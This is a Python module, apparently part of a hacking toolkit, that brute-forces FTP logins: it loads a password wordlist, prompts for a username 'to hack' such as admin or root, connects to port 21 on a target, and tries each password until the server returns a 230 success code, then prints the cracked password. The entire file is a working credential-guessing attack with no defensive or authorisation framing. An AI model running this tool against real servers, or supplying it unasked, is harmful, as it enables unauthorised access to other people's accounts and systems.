from modules.ask_file import ask_file
from modules.clear_scr import clear_scr
import socket


def ftp(server):
    clear_scr()

    print("[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n")
    passwords = ask_file().read_text().splitlines()
    username = input("Enter the username to hack(eg: admin, root): ")

    server = socket.gethostbyname(server)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        return print("Unable to create Socket.")
    try:
        s.connect((server, 21))
    except:
        return print("Unable To Connect.")
    data = s.recv(1024)
    for password in passwords:
        s.send('USER '.encode() + username.encode() + '\r\n'.encode())
        data = s.recv(1024)
        s.send('PASS '.encode() + password.encode()+'\r\n'.encode())
        data = s.recv(1024).decode()
        print(data)
        print("[*] Tried: "+password+"\n")
        if "230" in data:
            print("password found\n")
            return print("[*] Password is: " + password)
        else:
            print('[*] '+password+" is incorrect")
    s.send("Quit\r\n".encode())
    s.close
    print("No password Found. Try another word list or username.")
